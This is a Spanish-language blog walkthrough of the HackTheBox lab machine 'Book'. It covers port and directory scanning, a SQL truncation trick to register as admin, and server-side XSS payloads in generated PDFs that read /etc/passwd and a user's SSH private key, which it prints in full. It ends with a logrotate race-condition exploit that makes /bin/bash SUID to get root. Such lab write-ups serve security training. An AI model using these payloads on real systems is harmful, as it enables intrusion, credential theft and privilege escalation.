<!doctype html>
<html
  lang="en-us" 
  
    data-theme-mode="true"
  
>
  <head>
    <meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/>







  

<title>
  Book | Fouen
</title>
<meta
  name="description"
  content="Web enjoyer"
/>










<script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"clipboard\":{\"copyright\":{\"content\":\"x转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"❗Failed❗\",\"success\":\"Success✔️\"},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"time\":null}}}");
</script>

<script>
  window.siteConfig.swPath = '\/sw.js';
</script>











  
  
  
    
  

  
  
  
    
  

  
    

<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>






  <link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  />



  







  
 <link rel="stylesheet" href="/css/loader.min.2ad0e9bbffb534e893c0ecefc44787a277cf851387e8ad9dccfbc3a5f0886dbe.css" />




  <meta property="og:type" content="website" />
  <meta property="og:title" content="Book | Fouen" />
  <meta
    property="og:description"
    content="Web enjoyer"
  />
  <meta property="og:url" content="https://fouen.github.io/post/hackthebox/book/" />
  <meta
    property="og:site_name"
    content="Fouen"
  />
  <meta
    property="og:image"
    content="/images/book.png"
  />
  <meta property="article:author" content="Fouen" />
  <meta property="article:published_time" content="2024-08-14T00:00:00&#43;00:00" />
  <meta property="article:modified_time" content="2024-08-14T00:00:00&#43;00:00" />
  
    <meta property="article:tag" content="Medium" />
  
  
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/images/book.png" />
  
  
  
  
  




<link rel="shortcut icon" href="/favicon.ico">








  
 <link rel="stylesheet" href="/css/main.min.8c20df3b49214b6a60e9713b969bba46f323b1aa17f0f3fe02d14500a9aa5dd2.css" />





  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />






  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />








  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    
    
    
    
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
  ></script>





  


  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />





    
  </head>
  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        
          <img src="/images/perfilsinfondo.png" alt="loading" />
        
      </div>
      <div class="loading-word">...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>


<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


  <div class="notification-wrapper">
    <h1>New version found</h1>
    <p>The website seems to have new content, do you want to update?</p>
    <div class="notification-btn">
      <button id="notification-update-btn">Update</button>
      <button id="notification-close-btn">Cancel</button>
    </div>
  </div>

    <div id="container">
      <div id="wrap">
        
<div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe632;
          
        </div>
        <a class="main-nav-link" href="/">Home</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe62f;
          
        </div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
    
      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
    
  </nav>
</div>
<header id="header">
  
    
    <picture></picture>
      <img fetchpriority="high" src="/images/book.png" alt="Book">
    
  

  <div id="header-outer">
    <div id="header-title">
      
        
        
          
        
  
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">Book</h1>
          </a>
        
      
  
      
        
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>
        <div id="content"
          class="sidebar-left"
            >
          <aside id="sidebar">
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    >
      
        <div class="sidebar-toc-sidebar">
          <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconocimiento">Reconocimiento</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#gobuster">Gobuster</a></li>
      </ul>
    </li>
    <li><a href="#intrusión">Intrusión</a>
      <ul>
        <li><a href="#sql-truncation">SQL Truncation</a></li>
        <li><a href="#ganar-acceso">Ganar acceso</a></li>
      </ul>
    </li>
    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a></li>
  </ul>
</nav>
  </div>
</div>
        </div>
        <div class="sidebar-common-sidebar hidden">
          
<div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="Fouen"
    class="lazyload"
  />
  <div class="sidebar-author-name">Fouen</div>
  <div class="sidebar-description">Web enjoyer</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">12</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      3
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">11</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/FOUEN"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
    <div class="icon-linkedin sidebar-social-icon">
      <a
        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
        itemprop="url"
        target="_blank"
        aria-label="linkedin"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe62f;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
</div>

        </div>
      

      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  <div class="sidebar-widget">
    
  </div>
</aside>

          <section id="main">
  <article
  class="h-entry article"
  itemprop="blogPost"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta">
      <div class="article-date">
  <a
    href="https://fouen.github.io/post/hackthebox/book/"
    class="article-date-link"
    data-aos="zoom-in"
  >
    <time datetime="2024-08-14 00:00:00 &#43;0000 UTC" itemprop="datePublished"
      >2024-08-14</time
    >
    <time style="display: none;" id="post-update-time"
      >2024-08-14</time
    >
  </a>
</div>

      <div class="article-category">
  
    <a
      class="article-category-link"
      href="/categories/hackthebox"
      data-aos="zoom-in"
      >HACKTHEBOX</a
    >
  
</div>

    </div>
    <div class="hr-line"></div>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h2 id="reconocimiento">
<a class="header-anchor" href="#reconocimiento"></a>
Reconocimiento
</h2><h3 id="nmap">
<a class="header-anchor" href="#nmap"></a>
Nmap
</h3><p>Escaneamos la maquina para ver que puertos tiene abiertos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -p- --open --min-rate <span style="color:#ae81ff">5000</span> -Pn -n 10.10.10.176
</span></span></code></pre></div><pre tabindex="0"><code>PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre><h3 id="gobuster">
<a class="header-anchor" href="#gobuster"></a>
Gobuster
</h3><p>Uso gobuster para hacer fuzzing para ver posibles directorios o archivos ocultos:</p>
<pre tabindex="0"><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.176 -t 200 -x php
</code></pre><pre tabindex="0"><code>===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/profile.php          (Status: 302) [Size: 0] [--&gt; index.php]
/docs                 (Status: 301) [Size: 311] [--&gt; http://10.10.10.176/docs/]
/search.php           (Status: 302) [Size: 0] [--&gt; index.php]
/home.php             (Status: 302) [Size: 0] [--&gt; index.php]
/images               (Status: 301) [Size: 313] [--&gt; http://10.10.10.176/images/]
/download.php         (Status: 302) [Size: 0] [--&gt; index.php]
/contact.php          (Status: 302) [Size: 0] [--&gt; index.php]
/admin                (Status: 301) [Size: 312] [--&gt; http://10.10.10.176/admin/]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]
/collections.php      (Status: 302) [Size: 0] [--&gt; index.php]
/settings.php         (Status: 302) [Size: 0] [--&gt; index.php]
/index.php            (Status: 200) [Size: 6800]
/books.php            (Status: 302) [Size: 0] [--&gt; index.php]
/feedback.php         (Status: 302) [Size: 0] [--&gt; index.php]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
</code></pre><h2 id="intrusión">
<a class="header-anchor" href="#intrusi%c3%b3n"></a>
Intrusión
</h2><p>En la web vemos que necesitamos crearnos una cuenta:</p>
<p><img src="img/create.png" alt=""></p>
<p>Creamos la cuenta y vemos una página con varias cosas:</p>
<p><img src="img/web.png" alt=""></p>
<p>En el apartado de <code>Contact Us</code> podemos enviar un mensaje al correo del admin, esto es muy interesante ya que podemos intentar un <code>XSS</code> para robarle la cookie de sesión o mirar si le mandamos enlaces que esté programado para clicar en ellos:</p>
<p><img src="img/xss.png" alt=""></p>
<p>Pero esto no nos manda ninguna petición ni nada.</p>
<h3 id="sql-truncation">
<a class="header-anchor" href="#sql-truncation"></a>
SQL Truncation
</h3><p>Mirando mas a fondo la web vemos que podemos cambiar nuestro nombre pero nos lo capa a un limite de caracteres:</p>
<p><img src="img/cambio1.png" alt=""></p>
<p>Le damos a update</p>
<p><img src="img/cambio2.png" alt=""></p>
<p>Esto nos da una pista que se puede acontecer un <code>SQL Truncation</code></p>
<blockquote>
<p>Que es?
Es una vulnerabilidad donde, debido a un límite de longitud en una columna de la base de datos, se trunca el valor ingresado. Esto puede ser explotado para cambiar o bypass ciertos controles. Por ejemplo, si intentas crear un usuario con un nombre muy largo, el sistema podría truncarlo, permitiendo que alguien cree una cuenta con un nombre similar al de un usuario existente y, potencialmente, acceder a sus privilegios.</p>
</blockquote>
<p>Vamos a ver si funciona para crear otro usuario admin con la contraseña que pongamos nosotros</p>
<p>Para esto vamos a interceptar la petición con <code>burpsuite</code> y así la podemos modificar</p>
<p><img src="img/burp.png" alt=""></p>
<p>Después de varias pruebas veo que el limite son 20 caracteres y ahora cuando lo mando se crea el usuario, vamos a ver si tenemos acceso al panel administrador que he visto en el <code>gobuster</code>:</p>
<p><img src="img/admin.png" alt=""></p>
<p>Ya estamos como admin e la web</p>
<h3 id="ganar-acceso">
<a class="header-anchor" href="#ganar-acceso"></a>
Ganar acceso
</h3><p>En el panel de admin dentro de <code>collections.php</code> podemos descargar los pdf de los libros subidos y en la web podíamos subir pdf:</p>
<p><img src="img/subir.png" alt=""></p>
<p>Al subir un pdf lo podemos ver aquí:</p>
<p><img src="img/collection.png" alt=""></p>
<p><img src="img/collection2.png" alt=""></p>
<p>Vemos que se genera el pdf con el input de <code>Book Title</code> y <code>Author</code> que hemos puesto, por lo que se genera un pdf dinámico, podemos probar a usar esos campos vara ver archivos del sistema con este script de <a href="img/https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">HackTricks</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(){document.<span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>)};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span>);<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">send</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p><img src="img/etc.png" alt=""></p>
<p>Hemos visto que esta el <code>ssh</code> abierto por lo que vamos a intentar mirar la clave <code>id_rsa</code> del usuario <code>reader</code>:</p>
<p><img src="img/ssh1.png" alt=""></p>
<p>Lo podemos leer pero se corta al final de cada linea y no lo podemos copiar, vamos a solucionarlo con etiquetas de pre-formateo:</p>
<p>Añadiendo la etiqueta <code>&quot;&lt;pre&gt;&quot;</code> antes y después de <code>this.responseText</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(){document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>)};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;file:///home/reader/.ssh/id_rsa&#34;</span>);<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">send</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p>Ahora si:</p>
<pre tabindex="0"><code>-----BEGIN RSA PRIVATE KEY-----  
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ  
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0  
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0  
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s  
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK  
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7  
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+  
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI  
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ  
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz  
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6  
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL  
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/  
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+  
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l  
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V  
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m  
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC  
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u  
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh  
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf  
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi  
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW  
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN  
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=  
-----END RSA PRIVATE KEY-----
</code></pre><pre tabindex="0"><code>reader@book:~$ whoami
reader
</code></pre><h2 id="escalada-de-privilegios">
<a class="header-anchor" href="#escalada-de-privilegios"></a>
Escalada de Privilegios
</h2><p>Usaremos <code>pspy</code> para enumerar las tareas cron:</p>
<p>Vemos que <code>root</code>ejecuta un binario llamado <code>logrotate</code>, al buscar en google vemos que se puede explotar para escalar de privilegios:</p>
<p><a href="img/https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html">Logrotate Privilage Escalation</a></p>
<p>Consiste en una race condition, tenemos que crear un archivo con el payload que queremos que ejecute cuando se haga la race condition y luego compilar el programa que viene abajo:</p>
<p><code>payloadfile</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>chmod u+s /bin/bash
</span></span></code></pre></div><pre tabindex="0"><code>gcc logrotate.c -o logrotate
</code></pre><pre tabindex="0"><code>./logrotate -p payloadfile ./access.log
</code></pre><p>Ahora en otra terminal entramos al mismo usuario y modificamos algo en el <code>access.log</code> para que se produzca la condición:</p>
<pre tabindex="0"><code>echo a &gt; access.log
</code></pre><p>La bash ya tiene permisos suid</p>
<pre tabindex="0"><code>reader@book:~/backups$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
reader@book:~/backups$ bash -p
bash-4.4# whoami
root
</code></pre><p>Ya somos root!</p>

      
    </div>
    <footer class="article-footer">
      

      

      

      

      

      

      

      
      <ul class="article-tag-list" itemprop="keywords">
  
    <li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/medium"
        rel="tag"
        >MEDIUM</a
      >
    </li>
  
</ul>

    </footer>
  </div>
  
    
  
</article>










</section>
        </div>
        
        
        



  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  



<footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    <div>
      <span class="icon-copyright"></span>
      2024 -
      2025
      <span class="footer-info-sep "></span>
      Fouen
    </div>
    
    
      <div>
        <span class="icon-brush"
          >&nbsp;
            8.1k
          </span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;
          
          

          00:44
        </span>
      </div>
    
    
    
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar">
        <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconocimiento">Reconocimiento</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#gobuster">Gobuster</a></li>
      </ul>
    </li>
    <li><a href="#intrusión">Intrusión</a>
      <ul>
        <li><a href="#sql-truncation">SQL Truncation</a></li>
        <li><a href="#ganar-acceso">Ganar acceso</a></li>
      </ul>
    </li>
    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a></li>
  </ul>
</nav>
  </div>
</div>
      </div>
      <div class="sidebar-common-sidebar hidden">
        
<div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="Fouen"
    class="lazyload"
  />
  <div class="sidebar-author-name">Fouen</div>
  <div class="sidebar-description">Web enjoyer</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">12</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      3
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">11</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/FOUEN"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
    <div class="icon-linkedin sidebar-social-icon">
      <a
        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
        itemprop="url"
        target="_blank"
        aria-label="linkedin"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe62f;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
</div>

      </div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
      <div class="site-search">
        <div class="reimu-popup popup">
          <div class="reimu-search">
            <div class="reimu-search-input-icon"></div>
            <div class="reimu-search-input" id="reimu-search-input"></div>
            <div class="popup-btn-close"></div>
          </div>
          <div class="reimu-results">
            <div id="reimu-stats"></div>
            <div id="reimu-hits"></div>
            <div id="reimu-pagination" class="reimu-pagination"></div>
          </div>
          <img class="reimu-bg" src="/images/reimu.png" />
        </div>
      </div>
    
    






  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    
    
    
    
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
  ></script>




  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    
    
    
    
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
  ></script>









  
      
      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
      



  





  
      
      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
      

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script>








  
      
      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
      



  <script>
    var ALGOLIA_CONFIG = {
      logo: '\/images\/algolia_logo.svg',
      algolia: {
        applicationID: "",
        apiKey: "",
        indexName: "",
        hits: {
          "per_page": parseInt("10")
        },
        labels: {
          "input_placeholder": ".....",
          "hits_empty": "No data for ${query}",
          "hits_stats": ""
        }
      }
    };
  </script>
  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
    defer
    
    
    
    integrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"
  ></script>


  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
    defer
    
    
    
    integrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"
  ></script>


  





  
      
      <script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
      











<div id="lazy-script">
  <div>
    
      
      
        
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Fouen",
          title: "Book",
          url: "https:\/\/fouen.github.io\/post\/hackthebox\/book\/",
          description: "\rReconocimiento\rNmap\rEscaneamos la maquina para ver que puertos tiene abiertos:\nnmap -p- --open --min-rate 5000 -Pn -n 10.10.10.176 PORT STATE SERVICE\r22\/tcp open ssh\r80\/tcp open http Gobuster\rUso gobuster para hacer fuzzing para ver posibles directorios o archivos ocultos:\ngobuster dir -w …",
          cover: "https:\/\/fouen.github.io\/images\/book.png",
        };
      </script>
    
    
    
      





  
      
      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
      

      
      
      
      
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;

        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
